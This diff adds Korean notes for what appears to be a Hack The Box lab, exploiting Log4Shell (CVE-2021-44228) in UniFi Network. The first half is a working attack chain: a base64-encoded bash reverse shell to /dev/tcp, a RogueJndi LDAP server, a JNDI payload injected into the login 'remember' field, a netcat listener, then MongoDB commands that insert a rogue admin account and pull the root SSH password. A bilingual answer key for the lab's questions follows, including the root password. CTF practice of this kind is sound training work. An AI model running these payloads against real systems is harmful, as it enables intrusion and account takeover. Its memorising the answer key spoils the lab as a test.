@@ -1,0 +1,140 @@
+1. 포트 확인
+nmap -sV htb_ip
+
+
+2. 웹 접속
+터미널에 burpsuite 입력하여 버프스위트으로 브라우저 열기
+https://htb_ip:8443 접속
+
+
+3. base64 인코딩
+echo 'bash -i >& /dev/tcp/{tun0_ip}/4444 0>&1' | base64 -w 0
+값 복사 후
+java -jar target/RogueJndi-1.1.jar \
+  --command "bash -c {echo,복사한 base64값}|{base64,-d}|bash" \
+  --hostname "{내 tun0_ip}"
+
+새 터미널에서 리버스 쉘 대기
+nc -lvnp 4444
+
+
+4. 버프스위트 브라우저에서 접속한 사이트 로그인 시도
+test/test > 프록시로 값 변경
+파라미터
+username, password, remember, strict 중
+remember 의 값 false 에서 "${jndi:ldap://{tun0_ip}:1389/o=tomcat}" 변경
+
+
+5. user 플래그 확인
+리버스 쉘에서 cat /home/michael/user.txt
+
+
+6. 리버스 쉘로 관리자 확인
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+
+
+7. 리버스 쉘로 새 계정 추가
+새 터미널에서 mkpasswd -m sha-512 비밀번호 
+입력 후 복사
+리버스 쉘에 
+mongo --port 27117 ace --eval 'db.admin.insert({
+  "email" : "null@localhost.local",
+  "last_site_name" : "default",
+  "name" : "unifi-admin",
+  "time_created" : NumberLong(100019800),
+  "x_shadow" : "복사한 해시값"
+})'
+입력
+추가 됬는지 확인
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+
+
+8. 추가한 계정으로 로그인
+로그인은 됬짐나 버프스위트에 보이지 않아 리버스 쉘에서 진행
+
+
+9. 루트 계정 찾기
+mongo --port 27117 ace --eval "db.setting.find().forEach(printjson);"
+많으니 
+mongo --port 27117 ace --eval "db.setting.find({\"x_ssh_password\": {\$exists: true}}).forEach(printjson);"
+나온 루트 계정으로 로그인
+새 터미널에 ssh root@{htb_ip}
+입력 후 cat /root/root.txt
+
+
+-------------------------------
+
+
+1. Which are the first four open ports?
+처음 네 개의 열린 포트는 무엇입니까?
+
+> 22,6789,8080,8443
+
+
+2. What is the title of the software that is running running on port 8443?
+8443번 포트에서 실행 중인 소프트웨어의 제목은 무엇입니까?
+
+> UniFi Network
+
+
+3. What is the version of the software that is running?
+현재 실행 중인 소프트웨어 버전은 무엇입니까?
+
+> 6.4.54
+
+
+4. What is the CVE for the identified vulnerability?
+발견된 취약점에 대한 CVE는 무엇입니까?
+
+> CVE-2021-44228
+
+
+5. What protocol does JNDI leverage in the injection?
+JNDI는 데이터 주입 시 어떤 프로토콜을 활용하나요?
+
+> LDAP
+
+
+6. What tool do we use to intercept the traffic, indicating the attack was successful?
+공격이 성공했음을 나타내는 트래픽을 가로채는 데 사용하는 도구는 무엇입니까?
+
+> tcpdump
+
+
+7. What port do we need to inspect intercepted traffic for?
+가로챈 트래픽을 검사할 때 어떤 포트를 확인해야 합니까?
+
+> 389
+
+
+8. X
+
+
+9. What port is the MongoDB service running on?
+MongoDB 서비스는 어떤 포트에서 실행 중인가요?
+
+> 27117
+
+
+10. What is the default database name for UniFi applications?
+UniFi 애플리케이션의 기본 데이터베이스 이름은 무엇입니까?
+
+> ace
+
+
+11. What is the function we use to enumerate users within the database in MongoDB?
+MongoDB 데이터베이스에서 사용자를 열거하는 데 사용하는 함수는 무엇입니까?
+
+> db.admin.find()
+
+
+12. What is the function we use to update users within the database in MongoDB?
+MongoDB 데이터베이스에서 사용자 정보를 업데이트하는 데 사용하는 함수는 무엇인가요?
+
+> db.admin.update()
+
+
+13. What is the password for the root user?
+루트 사용자의 비밀번호는 무엇입니까?
+
+> NotACrackablePassword4U2022
